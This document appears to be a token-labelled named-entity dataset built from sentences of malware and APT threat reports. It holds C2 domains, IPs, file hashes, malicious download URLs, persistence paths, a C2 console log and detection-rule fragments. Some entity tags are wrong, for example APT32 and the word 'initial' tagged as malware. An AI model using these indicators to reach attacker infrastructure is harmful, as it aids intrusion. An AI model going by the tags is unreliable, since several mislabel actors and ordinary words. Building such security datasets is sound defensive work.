취약점을 O
이용한 O
악성코드는 O
2016년 O
9월에 O
처음 O
발견되었으며 O
, O
파일 O
전송 O
및 O
실행 O
등을 O
수행한다 O
. O

© O
AhnLab O
, O
Inc O
. O

' O
123 O
' O
is O
a O
campaign O
identifier O
hard O
coded O
into O
the O
backdoor O
. O

Cmstar B-malware.unknown
Yara O
Rule O

rouj.exe O
% O
TEMP%\AdobeARM.exe O
% O
TEMP%\iTunesHelper.exe O
% O
PROGRAMS%\Startup\AdobeRe.exe O
% O
USERPROFILE O
% O
\Local O
Settings\iexplore.exe O
% O
USERAPPDATA%\Microsoft\wuauclt.exe O
% O
PROGRAMS%\Startup\adobeup.exe O
% O
TEMP%\AdobeUpdater.exe O
NTLMSVC.DLL O
% O
PROGRAMS%\Startup\adobe_sl.lnk O
% O
TEMP%\runinfo.exe O

superfish.js O
. O

File O
name O
Size O
( O
bytes O
) O

Figure O
6 O
provides O
a O
summary O
of O
APT32 B-malware.infosteal
tools O
and O
techniques O
mapped O
to O
each O
stage O
of O
the O
attack O
lifecycle O
. O

Figure O
21 O
: O
Database O
management O
from O
a O
target O
system O
running O
Linux O
Figure O
22 O
: O
Virtual O
terminal O
from O
a O
target O
system O
running O
Linux O

[ O
그림 O
22 O
] O
2015년 O
( O
좌 O
) O
과 O
2017년 O
( O
우 O
) O
매크로 O
코드 O
비교 O

This O
code O
explains O
how O
the O
client O
communicates O
with O
the O
shell O
. O

butitistrun O
. O

In O
the O
screenshot O
of O
websites O
delivering O
malware O
via O
gokbayrak.com B-url.unknown
, O
we O
saw O
that O
the O
domain O
name O
macanna.com[.]tw B-url.unknown
was O
also O
used O
to O
distribute O
malware O
from O
this O
page O
. O

Its O
principal O
duties O
are O
to O
create O
the O
ZxShell B-malware.backdoor
main O
DLL O
in O
' O
c:\Windows\System32\commhlp32.dll O
' O
and O
to O
install O
the O
Kernel O
' O
Load O
Image O
Notify O
routine O
' O
. O

Copyright O
© O
2018 O
FireEye O
, O
Inc O
. O

CrowdStrike O
refers O
to O
activity O
corresponding O
to O
FireEye O
's O
APT28 B-malware.infosteal
and O
APT29 O
as O
' O
Fancy O
Bear O
' O
and O
' O
Cozy O
Bear O
, O
' O
respectively O
. O

field O
specifies O
the O
specific O
command O
that O
the O
client O
is O
requesting O
the O
server O
variant O
to O
perform O
. O

Which O
versions O
of O
Windows O
are O
targeted O
? O

Password O
hashes O
can O
be O
cracked O
within O
seconds O
using O
freely O
available O
tools O
. O

c O
: O
\Tools O
> O
findstr O
/R O
' O
[ O
< O
] O
[ O
? O
] O

The O
email O
title O
and O
attached O
file O
name O
were O
written O
in O
Japanese O
and O
contain O
general O
business O
, O
political O
, O
and O
economy-themed O
phrases O
such O
as O
( O
World O
economy O
) O
( O
economic O
policy O
) O
( O
budget O
estimation O
request O
) O
( O
Japan-US O
dialogue O
) O
( O
re-appointment O
of O
Prime O
Minister O
Abe O
) O
( O
contact O
network O
) O
( O
staff O
recruitment O
plan O
) O
( O
meeting O
) O
However O
, O
there O
is O
a O
change O
in O
the O
exploit O
document O
. O

Excerpt O
from O
G.php O
: O

Also O
included O
in O
this O
toolset O
is O
a O
script O
that O
decrypts O
and O
prints O
the O
contents O
of O
the O
log O
file O
created O
by O
XtremeRAT B-malware.backdoor
containing O
victim O
keystroke O
data O
. O

The O
backdoors O
will O
be O
installed O
and O
executed O
through O
PowerShell O
and O
rundll32 O
. O

The O
second O
domain O
is O
Iranian O
, O
allegedly O
owned O
by O
a O
web O
design O
company O
named O
Radcom O
. O

Figure O
6 O
. O

Risk O
Analysis O
: O
Have O
we O
conducted O
a O
cybersecurity O
risk O
analysis O
of O
the O
organization O
? O

The O
fShutdown O
flag O
can O
become O
set O
by O
the O
process O
loading O
the O
server O
variant O
calling O
the O
DllRegisterServer O
export O
. O

For O
more O
information O
, O
email O
cyberadvisor@hq.dhs.gov O
. O

Mrxcls O
( O
Stuxnet B-malware.backdoor
) O

We O
initially O
discovered O
the O
malware O
known O
as O
ANEL B-malware.backdoor
back O
in O
November O
2017 O
. O

18 O
November O
2015 O
. O

1 O
* O
/news/ O
feed.php O
? O

test O
' O
, O
while O
the O
Indian O
sample O
uses O
' O
dns.com B-url.normal
' O
) O
: O
[ O
* O
] O
C O
& O
C O
Running O
on O
0.0.0.0:443 B-url.cncsvr
[ O
+ O
] O
New O
client O
connected O
: O
( O
' O
192.168.56.110 B-ip.unknown
' O
, O
1443 O
) O
$ O
login O
$ O
192.168.56.110 B-ip.unknown
MyUser O
2013/06/07 O
02:18:35 O
Proxy O
20130401 O
[ O
+ O
] O
Authenticating O
on O
the O
bot O
OnLine O
Pw_OK O
When O
the O
authentication O
is O
confirmed O
, O
we O
are O
prompted O
with O
a O
shell O
through O
which O
we O
can O
interact O
in O
real-time O
with O
the O
bot O
. O

Therefore O
, O
differences O
between O
the O
available O
sample O
and O
others O
available O
to O
the O
community O
may O
become O
apparent O
in O
the O
future O
. O

The O
shellcode O
in O
turn O
triggers O
the O
GhostScript O
vulnerability O
in O
order O
to O
execute O
an O
embedded O
DLL O
that O
has O
also O
been O
XORed O
. O

However O
, O
besides O
the O
CSEC O
document O
there O
was O
no O
obvious O
pointer O
found O
leading O
to O
the O
conclusion O
that O
Babar B-malware.drop
and O
its O
companions O
were O
set O
out O
by O
French O
inteligence O
services O
. O

URL O
: O
hxxp://support(.)chatconnecting.com/2nx7m B-url.unknown
2017-01-20 O
10:11:47 O

Dino B-malware.backdoor
has O
been O
developed O
in O
C++ O
and O
presents O
a O
well­defined O
modular O
architecture O
. O

360.homeunix.com B-url.unknown
69.164.192.4 B-ip.unknown
alt1.homelinux.com B-url.unknown
amt1.homelinux.com B-url.unknown
aop1.homelinux.com B-url.unknown
app1.homelinux.com B-url.unknown
blogspot.blogsite.org B-url.unknown
filoups.info B-url.unknown
ftp2.homeunix.com B-url.unknown
ftpaccess.cc B-url.unknown
google.homeunix.com B-url.unknown
members.linode.com B-url.unknown
sl1.homelinux.org O
sl1.homelinux.org B-url.unknown
tyuqwer.dyndns.org B-url.unknown
update.ourhobby.com B-url.unknown
voanews.ath.cx B-url.unknown
webswan.33iqst.com:4000 B-url.unknown
yahoo.8866.org B-url.unknown
ymail.ath.cx B-url.unknown
yahooo.8866.org B-url.unknown
sl1.homelinux.org B-url.unknown
360.homeunix.com B-url.unknown
ftp2.homeunix.com B-url.unknown
update.ourhobby.com B-url.unknown
connectproxy.3322.org B-url.unknown
csport.2288.org B-url.unknown

In O
this O
heist O
the O
attackers O
created O
messages O
to O
transfer O
funds O
to O
Cambodia O
, O
the O
US O
, O
and O
Sri O
Lanka O
. O

Additionally O
, O
it O
provides O
examination O
of O
a O
FinSpy B-malware.backdoor
Mobile I-malware.backdoor
sample O
found O
in O
the O
wild O
, O
which O
appears O
to O
have O
been O
used O
in O
Vietnam O
. O

Key O
= O
$ O
key O
$ O
prov.IV O
= O
$ O
iv O
$ O
decr O
= O
$ O
prov.CreateDecryptor O
( O
$ O
prov O
. O

[ O
Online O
] O
http://www.haaretz.com/blogs/diplomania/israel-s-foreign-ministry-targeted-by-computer-virus-bearing-idf-chief-s-name.premium-1.472278 B-url.normal
. O

It O
fakes O
and O
overrides O
the O
array O
object O
to O
perform O
arbitrary O
address O
reading O
and O
writing O
. O

If O
the O
dropper O
is O
executed O
with O
administrator O
privileges O
, O
then O
it O
tries O
to O
write O
the O
following O
files O
in O

For O
starters O
, O
it O
employs O
several O
' O
hide O
in O
plain O
sight O
' O
techniques O
common O
to O
malware O
used O
in O
targeted O
attacks O
. O

b85c17f92629fec41502b44cf86ba859 B-hash
6f08808d0be510698563d3b0443fe5a4 B-hash
b8c6c8eeb9a18b1d4632bc8191db5517 B-hash
ddff0a7643f4ff2fe777e768e7bae004 B-hash
2395c798ca8628e735ac2d8d274cd230 B-hash
bc6baf7a1d420d226a7a157b412a51d9 B-hash
8ba38899a6446366724d98761dd10d46 B-hash
d538e50df25e30f3c4252ce523507d23 B-hash
a50da199db97abb2dfd6fd62b5a00f02 B-hash
2a1884bdab940ea66b28599245e79fa9 B-hash
2f30034885045bae4a201bf6b3913b54 B-hash
23c3f3e93ea2ffe704abb602d04588c0 B-hash
b8c6c8eeb9a18b1d4632bc8191db5517 B-hash
e5500274853f77be6ffba610dac2cae4 B-hash
ffa1bdc105013e1cbb00483b412b98b8 B-hash
0264076c190af6e1176e1abff47d1ae8 B-hash
02ef03bd5e6dbf9c03e8504c9e797abd B-hash
Name O
D O
: O
\IL\Working O
Tools\2016-04-23 O
NeD O
Ver O
9 O
Ran O
Il O
- O
192.52.167.118\NeD O
Download O
and O
execute O
Version O
1 O
- O
Doc\bin\Release\Obfuscated\News.pdb O
http://bit[.]ly/1YRoIPX B-url.unknown
http://smail.otzo[.]com/W/Gfsdfsdfsrydkfpsdmfpsadsdfsdf B-url.unknown
sdfsdfdfsp.php I-url.unknown
http://smail.otzo[.]com/y/analysis--hezbollah.rar B-url.unknown
https://drive.google[.]com/uc?export=download&amp;id= B-url.unknown
0B7XzN8DNbJKiQlFNRHdVTmpCd0U I-url.unknown
https://drive.google[.]com/uc?export=download&id=0Bxa B-url.unknown
UrWGCqlWLMTQzMVFNOENIUFk I-url.unknown
drops O
ad5531b085ef005ee12319e88fb8f674 B-hash
Updata.exe O

Protect O
Against O
SQL O
Injection O
and O
Other O
Attacks O
on O
Web O
Services O

10006148 O
60 O
09 O
67 O
09 O
66 O
09 O
6A O
09 O
67 O
09 O
68 O
09 O
7D O
09 O
60 O
09 O
' O
.g.f.j.g.h. O
} O
. O
' O
. O

So O
, O
it O
will O
bring O
great O
difficulties O
to O
the O
forensic O
work O
. O

One O
alternative O
theory O
regarding O
the O
use O
of O
the O
Russian O
language O
in O
the O
application O
could O
be O
that O
targeting O
may O
have O
been O
directed O
at O
pro-Russian O

In O
the O
beginning O
of O
December O
2015 O
, O
three O
samples O
were O
submitted O
to O
online O
malware O
detection O
and O
analysis O
platforms O
malwr.com B-url.normal
and O
Virus O
Total O
. O

To O
be O
able O
to O
decipher O
the O
data O
, O
the O
attacker O
should O
certainly O
know O
either O
the O
MD5 O
hash O
or O
the O
whole O
buffer O
content O
. O

To O
find O
the O
ASPX O
shell O
, O
modify O
the O
regex O
to O
fit O
the O
syntax O
of O
the O
ASPX O
shell O
as O
shown O
: O
Researchers O
unsure O
where O
all O
of O
the O
PHP O
or O
ASPX O
files O
are O
on O
a O
Windows O
host O
can O
use O
the O
dir O
command O
with O
some O
extended O
options O
to O
help O
identify O
Web O
files O
to O
run O
the O
regex O
command O
against O
( O
see O
Figure O
28 O
) O
. O

It O
is O
' O
checkupdate O
( O
) O
' O
and O
it O
seems O
that O
the O
malware O
is O
instructed O
to O
contact O
periodically O
the O
C O
& O
C O
waiting O
for O
new O
commands O
. O

After O
receiving O
its O
SESSIONID O
, O
the O
backdoor O
does O
a O
fingerprint O
of O
the O
system O
. O

After O
spreading O
the O
malware O
, O
more O
Android O
smartphones O
has O
been O
infected O
using O
the O
same O
technique O
( O
via O
Telegram O
) O
and O
then O
repost O
the O
malware O
again O
and O
again O
making O
a O
network O
of O
victims O
. O

Notice O
that O
these O
numbers O
vary O
based O
on O
the O
dataset O
. O

In O
the O
course O
of O
that O
campaign O
, O
APT29 B-malware.backdoor
successfully O
compromised O
a O
U.S. O
political O
party O
. O

This O
configuration O
is O
located O
in O
the O
following O
directory O
on O
the O
victim O
device O
: O

It O
is O
likely O
that O
it O
was O
downloaded O
onto O
the O
victim O
's O
computer O
after O
receiving O
an O
instruction O
by O
the O
C O
& O
C O
servers O
. O

This O
post O
contains O
analysis O
of O
several O
pieces O
of O
malware O
obtained O
by O
Vernon O
Silver O
of O
Bloomberg O
News O
that O
were O
sent O
to O
Bahraini O
pro-democracy O
activists O
in O
April O
and O
May O
of O
this O
year O
. O

תדחוימ O
הדיחי O
special O
forces O
unit O

' O
IDF O
NEWS O
[ O
RTLO O
] O
cod.SCR O
' O

After O
alerting O
the O
attackers O
they O
have O
been O
discovered O
, O
the O
dropper O
will O
try O
to O
delete O
the O
temporary O
files O
created O
by O
him O
and O
terminate O
activity O
of O
the O
infection O
process O
. O

The O
internet O
communication O
module O
of O
Babar B-malware.drop
is O
located O
in O
a O
sparate O
export O
called O
' O
FindCtxSectionStringW O
' O
, O
which O
will O
be O
invoked O
through O
remote O
thread O
injection O
at O
runtime O
. O

More O
precisely O
, O
when O
a O
modification O
is O
made O
to O
a O
module O
's O
content O
in O
memory O
, O
the O
PSM O
module O
saves O
it O
as O
a O
serialized O
DataStore O
. O

It O
's O
interesting O
that O
one O
sample O
of O
the O
directory O
listing O
collector O
was O
infected O
with O
the O
infamous O
' O
Viking B-malware.drop
' O
virus O
of O
Chinese O
origin O
. O

The O
reason O
for O
the O
shift O
is O
unknown O
. O

Separate O
administrators O
into O
privilege O
tiers O
with O
limited O
access O
to O
other O
tiers O
. O

A O
copy O
has O
been O
sent O
to O
cso_ O
[ O
removed_by_analyst O
].com O
and O
investigation@policeheadquater[.]com O
Police O
Investigation O
Department O
-- O
- O
Disclaimer O
-- O
- O
The O
information O
in O
this O
mail O
is O
confidential O
and O
is O
intended O
solely O
for O
addressee O
. O

Many O
thanks O
to O
the O
team O
for O
working O
with O
The O
exploit O
uses O
a O
Microsoft O
Office O
document O
to O
download O
and O
execute O
an O
Adobe B-malware.drop
Flash I-malware.drop
exploit O
to O
victim O
computers O
. O

X-Agent B-malware.backdoor
is O
a O
persistent O
payload O
injected O
into O
the O
victim O
machine O
that O
can O
be O
compiled O
for O
almost O
any O
Operating O
System O
and O
can O
be O
enhanced O
by O
adding O
new O
ad-hoc O
component O
developed O
for O
the O
specific O
cyber-attack O
. O

Domains O
: O

The O
functionality O
remains O
the O
same O
: O
it O
is O
a O
standard O
backdoor O
that O
uses O
the O
Telegram O
Bot O
API O
in O
order O
to O
receive O
commands O
from O
, O
and O
send O
responses O
to O
, O
the O
malware O
operator O
. O

http://researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug-using-poison-ivy/ B-url.normal

Table O
1 O
: O
Commands O
used O
by O
Asruex B-malware.drop
Collect O
information O
of O
infected O
hosts O
Obtain O
process O
list O
Obtain O
file O
list O
Change O
waiting O
time O
Obtain O
version O
information O
Uninstall O
Obtain O
folder O
list O
Load O
DLL O
Execute O
external O
DLL O
( O
AdvProv.dll O
) O
AdvProv.dll O
is O
encrypted O
using O
XOR O
and O
3DES O
. O

Search O
historic O
and O
future O
emails O
that O
match O
the O
included O
indicators O
of O
compromise O
. O

DecryptResource_sub_49D9EC O
( O
) O
. O

Like O
the O
Trojan O
from O
the O
first O
campaign O
, O
this O
sample O
is O
executed O
through O
search-order O
hijacking O
. O

After O
the O
capture O
of O
the O
new O
activity O
, O
we O
contacted O
Microsoft O
immediately O
and O
shared O
detailed O
information O
with O
them O
. O

HKCU O
\Software\Microsoft\Windows\ O
CurrentVersion\Run\'dllhost O
' O
= O
% O
Temp%\WmiPrvSer.exe O

The O
file O
had O
been O
identified O
only O
once O
: O
it O
had O
been O
sent O
for O
scanning O
to O
VirusTotal O
from O
China O
in O
May O
2011 O
. O

See O
below O
for O
more O
information O
about O
them O
. O

Even O
after O
encoding O
every O
single O
string O
related O
to O
malicious O
code O
, O
the O
DUBNIUM B-malware.drop
malware O
goes O
one O
more O
step O
to O
hide O
its O
internal O
operations O
. O

Cleaning O
and O
Repair O

Created O
by O
' O
ahmed O
' O
, O
saved O
by O
' O
aert O
' O
word.doc O
: O
IDF O
NEWS.doc O
: O
Created O
and O
saved O
by O
' O
aert O
' O
Brotherhood.doc O
: O
Created O
and O
saved O
by O
' O
aert O
' O
Created O
and O
saved O
by O
' O
aert O
' O
detl.doc O
: O
Created O
and O
saved O
by O
' O
HinT O
' O
Advisor.doc O
: O
IDF.doc O
: O
Created O
and O
saved O
by O
' O
aert O
' O
Created O
and O
saved O
by O
' O
HinT O
' O
System.doc O
: O
Created O
and O
saved O
by O
' O
HinT O
' O
York.doc O
: O
barrage.doc O
: O
Created O
and O
saved O
by O
' O
HinT O
' O
shehab.doc O
: O
Created O
and O
saved O
by O
' O
HinT O
' O

Some O
droppers O
for O
the O
IRONGATE B-malware.backdoor
malware O
would O
not O
run O
if O
VMware O
or O
Cuckoo O
Sandbox O
environments O
were O
employed O
. O

Another O
variant O
of O
this O
backdoor O
uses O
the O
same O
winsocks.exe B-malware.backdoor
with O
a O
different O
dropping O
mechanism O
and O
was O
found O
at O
http[:]//199.91.173[.]43/Classified_Video.flv.scr B-ip.unknown
and O
http[:]//199.91.173[.]43/sarbajit_leaked_video.wmv.scr B-ip.unknown
. O

If O
it O
is O
, O
the O
botnet O
connection O
I/O O
procedure O
is O
called O
through O
the O
MainConnectionIo O
function O
. O

One O
of O
method O
uses O
a O
very O
interesting O
technique O
of O
payload O
execution O
which O
is O
designed O
mostly O
to O
bypass O
modern O
anti-malware O
products O
. O

The O
group O
hit O
organizations O
in O
Israel O
, O
Jordan O
, O
the O
United O
Arab O
Emirates O
, O
Saudi O
Arabia O
, O
and O
Turkey O
. O

The O
technical O
information O
is O
being O
delivered O
to O
you O
as O
is O
and O
Symantec O
Corporation O
makes O
no O
warranty O
as O
to O
its O
accuracy O
or O
use O
. O

Besides O
the O
project O
name O
, O
Babar64 B-malware.drop
also O
shares O
the O
malformed O
user O
agent O
string O
described O
in O
the O
document O
, O
where O
a O
letter O
from O
the O
MSIE O
6.0 O
name O
is O
missing O
. O

In O
a O
slight O
change O
to O
the O
previous O
variant O
, O
the O
new O
payloads O
are O
executed O
with O
a O
Windows O
Scheduled O
Task O
. O

Word O
document O
( O
see O
Exhibit O
1 O
) O
with O
the O
following O
properties O
: O
: O
f12fc711529b48bcef52c5ca0a52335a B-hash
: O
mary O
: O
mary O
: O
2018:01:19 O
14:56:00 O
( O
Jan O
. O

Figure O
14 O
. O

Sometimes O
the O
contractors O
would O
compete O
with O
each O
other O
, O
sometimes O
they O
would O
work O
together O
, O
but O
payment O
was O
only O
made O
once O
the O
objective O
was O
completed O
. O

Only O
the O
best O
teams O
succeed O
, O
are O
paid O
, O
and O
remain O
in O
business O
. O

The O
jmidebs O
and O
Duqu B-malware.infosteal
drivers O
use O
stubs O
with O
a O
total O
size O
of O
7061 O
bytes O
. O

http://- O
If O
this O
appears O
in O
unlabeled O
textbox1 O
, O
download O
content O
from O
the O
assumed O
URL O
. O

The O
backdoor O
is O
also O
capable O
of O
elevating O
its O
privileges O
on O
win7 O
and O
above O
using O
a O
method O
similar O
to O
the O
one O
described O
here O
: O
http://www.pretentiousname.com/misc/win7_uac_whitelist2.html B-url.unknown
. O

Fidelis O
researchers O
have O
developed O
a O
set O
of O
rules O
for O
detecting O
the O
Shamoon B-malware.unknown
malware O
along O
the O
entire O
threat O
life O
cycle O
: O
initial O
infection O
, O
lateral O
propagation O
, O
and O
command O
and O
control O
communication O
. O

Combining O
unmatched O
experience O
and O
specialized O
skills O
across O
more O
than O
40 O
industries O
and O
all O
business O
functions O
— O
underpinned O
by O
the O
world O
's O
largest O
delivery O
network— O
Accenture O
works O
at O
the O
intersection O
of O
business O
and O
technology O
to O
help O
clients O
improve O
their O
performance O
and O
create O
sustainable O
value O
for O
their O
stakeholders O
. O

C O
& O
C O
: O

designates O
a O
volume O
serial O
number O
collect O
data O
harvested O
from O
a O
targeted O
system O
designates O
a O
volume O
serial O
number O
infect O
this O
particular O
drive O
designates O
any O
connected O
volume O
not O
listed O
above O
retrieve O
a O
directory O
listing O
from O
the O
just O
connected O
drive O
, O
re O
: O
00 O

Aikapool[.]com O
is O
a O
public O
mining O
pool O
and O
port O
7915 O
is O
used O
for O
DogeCoin O
: O
The O
username O
( O
myapp2150 O
) O
was O
used O
to O
register O
accounts O
in O
several O
forums O
and O
on O
Reddit O
. O

3DA8C22F5340850EE5A2C25B1D17FC27 B-hash
loading.myftp.org B-url.cncsvr

Figure O
3 O
. O

While O
Freegate B-malware.infosteal
was O
erroneously O
labelled O
a O
Trojan B-malware.backdoor
by O
one O
anti-virus O
company O
nearly O
a O
decade O
ago O
, O
in O
this O
attack O
, O
attackers O
packaged O
what O
appears O
to O
be O
a O
legitimate O
version O
of O
Freegate B-malware.infosteal
with O
a O
malicious O
implant O
. O

First O
Seen O
: O
Dropper O
Filename O
: O

jdk-7u12-windows-i586.java-se.com O
on O
the O
Japanese O
IP O
address O
210.253.96.200.7506 B-ip.unknown
| O
210.253.96.0/20 B-ip.unknown
| O
INTERQ O
| O
JP O
| O
GMO.JP O
| O
GMO O
INTERNET O
INC O
. O

PCC_FILE::ProcessPacketEx.PCC_FILE::ProcessPacketEx O
performs O
no O
file O
management O
operations O
but O
instead O
adds O
any O
incoming O
command O
packets O
to O
a O
queue O
for O
processing O
by O
PCC_FILE O
: O
:ReadWaitingData O
if O
the O
packet O
is O
not O
already O
within O
the O
queue O
( O
thus O
avoiding O
duplication O
of O
commands O
) O
. O

I O
attained O
full O
functionality O
using O
the O
Gh0st B-malware.backdoor
3.6 O
protocol O
in O
the O
controller O
, O
despite O
the O
fact O
that O
the O
incoming O
structure O
was O
not O
exactly O
what O
my O
customized O
controller O
expected O
. O

CTUTM O
researchers O
assess O
with O
moderate O
confidence O
that O
the O
group O
is O
operating O
from O
the O
Russian O
Federation O
and O
is O
gathering O
intelligence O
on O
behalf O
of O
the O
Russian O
government O
. O

The O
dropped O
file O
is O
then O
executed O
as O
shown O
in O
the O
below O
screen O
shot O
. O

An O
attack O
using O
a O
malicious O
installer O
of O
a O
working O
and O
reputable O
security O
or O
proxy O
tool O
is O
especially O
pernicious O
as O
it O
targets O
users O
who O
likely O
recognize O
the O
importance O
of O
privacy O
and O
circumvention O
, O
and O
may O
believe O
that O
they O
have O
increased O
their O
privacy O
and O
security O
by O
installing O
the O
tool O
. O

' O
Referer O
: O
' O
; O
http_header O
; O
http_method O
; O
content O
: O
! O

The O
list O
is O
extensive O
and O
includes O
major O
organizations O
and O
smaller O
entities O
alike O
. O

Summary O
: O
WhiteBear O
is O
a O
cluster O
of O
activity O
targeting O
foreign O
embassies O
and O
MFA O
organizations O
, O
starting O
in O
early O
2016 O
and O
continued O
into O
early O
2017 O
. O

This O
document O
provides O
technical O
details O
regarding O
the O
tools O
and O
infrastructure O
used O
by O
the O
Russian O
civilian O
and O
military O
intelligence O
Services O
( O
RIS O
) O
to O
compromise O
and O
exploit O
networks O
and O
endpoints O
associated O
with O
the O
U.S. O
election O
, O
as O
well O
as O
a O
range O
of O
U.S. O
Government O
, O
political O
, O
and O
private O
sector O
entities O
. O

For O
horizons-tourisme.com B-url.normal
: O

71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97 B-hash

In O
both O
cases O
, O
the O
key O
is O
Unicode O
. O

2017년에는 O
공격 O
성공 O
가능성을 O
극대화하기 O
위해 O
PC방 O
관리 O
프로그램을 O
이용해 O
다수의 O
컴퓨터에 O
악성코드를 O
유포했다 O
. O

It O
seems O
highly O
unlikely O
that O
this O
was O
the O
only O
project O
that O
its O
authors O
were O
involved O
in O
. O

The O
quickest O
and O
easiest O
method O
, O
especially O
on O
a O
Linux O
machine O
, O
is O
probably O
using O
regular O
expressions O
. O

re O
sult O
= O
0 O
; O
dwType O
= O
4 O
; O
cbData O
= O
4 O
; O
str_AppID O
= O
decrypt_string O
( O
& O
enc_AppID O
) O
; O
( O
( O
RegQueryValueExA O
( O
hKey O
, O
str_AppID O
, O
0 O
, O
& O
dwType O
, O
& O
result O
, O
& O
cbData O
) O
| O
| O
dwType O
! O
= O
& O
& O
( O
dwType O
= O
4 O
, O
result O
= O
get_tickcount_based_value O
( O
) O
, O
RegSetValueExA O
( O
hKey O
, O
str_AppID O
, O
0 O
, O
dwType O
, O
& O
result O
, O
4u O
) O
) O
) O

While O
we O
do O
n't O
have O
visibility O
into O
Israeli O
government O
mails O
, O
we O
do O
receive O
a O
lot O
of O
suspicious O
executable O
files O
, O
and O
a O
little O
digging O
gives O
results O
. O

Funnily O
enough O
, O
the O
key O
serving O
to O
encrypt O
the O
file O
on O
disk O
is O
' O
PsmIsANiceM0du1eWith0SugarInside O
' O
. O

Figure O
7 O
. O

Babar B-malware.drop
does O
show O
the O
same O
obscure O
treatment O
for O
installed O
anti-virus O
products O
as O
the O
Bunny B-malware.unknown
malware O
though O
. O

Bot O
: O

The O
call O
graph O
for O
this O
functionality O
is O
shown O
in O
Figure O
16 O
. O

[ O
그림 O
16 O
] O
Anonymous B-malware.unknown
검사 O
코드 O

3f288dfa95d90a3cb4503dc5f3d49c16 B-hash
Server O
Cometa4 O

Security O
researchers O
have O
often O
made O
the O
mistake O
of O
assuming O
that O
when O
a O
specific O
tool O
was O
observed O
being O
used O
in O
espionage O
attacks O
, O
it O
was O
representative O
of O
activity O
of O
a O
single O
actor O
. O

The O
following O
detections O
are O
in O
place O
today O
: O

We O
suspect O
this O
router O
was O
hacked O
as O
part O
of O
the O
campaign O
in O
order O
to O
process O
the O
malware O
's O
HT O
T O
P O
requests O
. O

Other O
open O
source O
and O
semi-legitimate O
pen-testing O
tools O
like O
nbtscan O
and O
powercat O
are O
being O
used O
for O
mapping O
available O
resources O
and O
lateral O
movement O
as O
well O
. O

In O
addition O
, O
there O
are O
other O
issues O
, O
mostly O
to O
do O
with O
the O
creation O
of O
the O
Trojan O
, O
or O
rather O
the O
platform O
used O
to O
implement O
Duqu B-malware.infosteal
as O
well O
as O
Stuxnet B-malware.backdoor
. O

APT-C-06 O
组织在全球范围内首例使 O

large O
file O
sizes O
, O
and O
password-protected O
documents O
– O
each O
of O
which O
are O
described O
in O
the O
sections O
below O
. O

The O
attack O
we O
analyzed O
is O
multi-stage O
, O
an O
initial B-malware.drop
dropper O
malware O
written O
in O
Delphi O
programming O
language O
( O
a O
language O
used O
by O
the O
APT28 O
in O
other O
campaigns O
) O
downloads O
a O
second O
stage O
payload O
from O
internet O
and O
executes O
it O
. O

A O
report O
written O
by O
the O
Swiss O
federal O
police O
, O
which O
investigated O
the O
origin O
of O
several O
of O
the O
spearphishing O
emails O
sent O
to O
Ablyazov O
's O
family O
and O
associates O
, O
concluded O
that O
the O
emails O
were O
sent O
from O
IP O
addresses O
in O
India O
. O

ATTRIBUTION O

In O
English O
, O
chinch O
is O
the O
word O
for O
a O
small O
North O
American O
bug O
, O
Blissus O
leucopterus O
. O

The O
VBS O
code O
in O
this O
file O
( O
Figure O
10 O
) O
has O
the O
ability O
to O
recreate O
the O
whole O
chain O
and O
download O
the O
same O
ZIP O
archive O
. O

And O
around O
the O
same O
time O
, O
another O
' O
certified O
distributor O
' O
winrar[.]it B-url.normal
served O
trojanized O
installers O
as O
well O
. O

The O
messages O
we O
previously O
identified O
represent O
the O
actual O
commands O
that O
can O
be O
sent O
to O
the O
bot O
: O

Source O

The O
IP O
addresses O
corresponded O
to O
a O
mix O
of O
public O
and O
private O
financial O
institutions O
spread O
across O
the O
globe O
: O
However O
, O
banks O
in O
some O
specific O
countries O
feature O
prominently O
in O
the O
list O
: O
Rank O
Country O
Poland O
Count O
United O
States O
Mexico O
United O
Kingdom O
7 O
Chile O
Brazil O
Peru O
Colombia O
Denmark O
India O
The O
prominence O
of O
Polish O
and O
Mexican O
banks O
matches O
the O
observation O
of O
watering-hole O
code O
on O
sites O
in O
both O
countries O
. O

ATTACK O
GROUPS O
SEND O
MALWARE O
, O
SPEARPHISHING O
EMAILS O
, O
COMMAND O
AND O
CONTROL O
TO O
JAPAN O
AND O
TAIWAN O
, O
AS O
WELL O
AS O
THE O
REST O
OF O
THE O
WORLD O
POSSIBLE O
SHARING O
OF O
TOOL O
ACROSS O
ATTACK O
GROUPS O

This O
command O
populates O
the O
file O
scxrt2.ini O
with O
a O
comma-separated O
list O
of O
network O
resources O
identified O
by O
the O
host O
system O
. O

The O
executables O
are O
RC4 O
encrypted O
and O
then O
attached O
. O

It O
is O
highly O
probable O
that O
the O
malware O
was O
developed O
in O
native O
Chinese O
language O
, O
and O
the O
operation O
control O
system O
is O
designed O
for O
Chinese O
users O
, O
indicating O
the O
entire O
operation O
is O
Chinese O
. O

Figure O
9 O
: O
IIS O
directory O
showing O
time O
stamps O
prior O
to O
the O
time O
modification O

SHA1 O
SHA256 O
5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e B-hash
161c840748df9b49fda878394398425a B-hash
e3cc84a4dc66e43453a039c3c983fcef92eafa7d B-hash

By O
adding O
the O
URI O
generator O
of O
the O
HTTPprov O
library O
, O
the O
following O
URL O
could O
be O
generated O
: O

We O
have O
seen O
this O
campaign O
use O
both O
email O
and O
drive­by O
downloads O
as O
a O
means O
of O
infecting O
end O
users O
. O

Once O
the O
filename O
and O
command O
string O
is O
extracted O
, O
the O
malware O
compares O
the O
command O
string O
with O
the O
string O

File O
Name O
: O
Payment B-malware.infosteal
details.jar I-malware.infosteal
File O
Size O
: O
43887 O
bytes O
MD5 O
: O
bd0aba05d8263fb1a9a3adcae01fc3b7 B-hash
SHA1 O
: O
c60551e65cbe54899d1cd1f637b572455dc33b1b B-hash

The O
data O
is O
stored O
in O
the O
last O
0x100 O
bytes O
of O
the O
file O
. O

The O
BBC O
. O

These O
hostnames O
may O
be O
related O
but O
at O
the O
time O
of O
this O
writing O
we O
have O
not O
seen O
them O
in O
use O
in O
malware O
and O
are O
unable O
to O
confirm O
. O

5/10 O

As O
shown O
in O
the O
hit O
log O
above O
, O
the O
most-downloaded O
malicious O
modules O
are O
the O
SFX O
installer O
and O
the O
Gh0st B-malware.backdoor
RAT I-malware.backdoor
backdoor O
. O

The O
characteristics O
of O
the O
malware O
( O
' O
a.txt O
' O
and O
' O
config.json O
' O
files O
) O
and O
the O
functionality O
of O
it O
is O
very O
similar O
to O
JSocket B-malware.backdoor
and O
